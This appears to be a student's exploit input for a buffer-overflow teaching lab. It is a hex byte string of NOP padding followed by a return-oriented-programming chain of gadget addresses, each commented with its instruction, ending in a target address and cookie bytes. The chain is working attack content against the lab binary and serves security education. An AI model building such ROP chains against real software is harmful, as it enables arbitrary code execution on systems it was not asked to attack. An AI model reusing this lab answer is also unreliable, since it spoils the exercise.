90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
3f 17 40 00 00 00 00 00   //mov rsp, rax
0c 17 40 00 00 00 00 00   //mov rax, rdi
f3 16 40 00 00 00 00 00   //pop rax
48 00 00 00 00 00 00 00
25 17 40 00 00 00 00 00   //mov eax, ecx
94 17 40 00 00 00 00 00   //mov ecx, edx
66 17 40 00 00 00 00 00   //mov edx, esi
1e 17 40 00 00 00 00 00   //add_xy
0c 17 40 00 00 00 00 00   //mov rax, rdi
3d 16 40 00 00 00 00 00
31 37 65 34 65 36 65 61   //cookie